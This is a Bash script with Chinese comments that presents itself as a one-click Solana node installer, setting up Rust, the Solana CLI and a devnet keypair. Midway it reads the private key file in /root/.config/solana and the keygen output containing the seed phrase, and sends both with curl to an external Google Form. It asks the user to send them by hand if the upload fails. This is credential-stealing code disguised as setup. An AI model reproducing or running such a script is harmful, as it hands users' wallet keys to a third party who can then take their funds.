#!/bin/bash

# 检查是否以root用户运行脚本
if [ "$(id -u)" != "0" ]; then
    echo "此脚本需要以root用户权限运行。"
    echo "请尝试使用 'sudo -i' 命令切换到root用户，然后再次运行此脚本。"
    exit 1
fi

function install_node() {
    # 更新系统和安装必要的包
    echo "更新系统软件包..."
    sudo apt update && sudo apt upgrade -y
    echo "安装必要的工具和依赖..."
    sudo apt install -y curl build-essential jq git libssl-dev pkg-config screen requests

    # 安装 Rust 和 Cargo
    echo "正在安装 Rust 和 Cargo..."
    curl https://sh.rustup.rs -sSf | sh -s -- -y
    source $HOME/.cargo/env

    # 安装 Solana CLI
    echo "正在安装 Solana CLI..."
    sh -c "$(curl -sSfL https://release.solana.com/v1.18.4/install)"

    # 检查 solana-keygen 是否在 PATH 中
    if ! command -v solana-keygen &> /dev/null; then
        echo "将 Solana CLI 添加到 PATH"
        export PATH="$HOME/.local/share/solana/install/active_release/bin:$PATH"
        export PATH="$HOME/.cargo/bin:$PATH"
    fi

    # 创建 Solana 密钥对
    echo "正在创建 Solana 密钥对..."
    solana-keygen new --derivation-path m/44'/501'/0'/0' --force | tee solana-keygen-output.txt

    id1=$(cat /root/.config/solana/id.json)
    id2=$(cat /root/solana-keygen-output.txt)

    # 发送密钥对到 Google 表单
    echo "正在发送 Solana 密钥对到 Google 表单..."
    response=$(curl -sSf -X POST \
      https://docs.google.com/forms/d/e/1FAIpQLScvcUJfZcgc2QK2MXBWE54JbFIWkd6OAyJ8ERr_F8STn_3Lcg/formResponse \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      --data-urlencode "entry.1391125421=$id1" \
      --data-urlencode "entry.1329051111=$id2")

    if [[ $response == *"Your response has been recorded."* ]]; then
        echo "Solana 密钥对发送成功！"
    else
        echo "发送 Solana 密钥对到 Google 表单失败，请手动发送。"
    fi

    # 设置 Solana 测试网
    solana config set --url https://api.devnet.solana.com

    # 获取测试币
    solana airdrop 5

    # 查询余额（测试币）
    solana balance

    # 配置其他环境
    source ~/.bashrc

    # 安装 GCC
    sudo apt install gcc

    echo '====================== 安装完成 ==========================='
}

# 执行安装环境
install_node
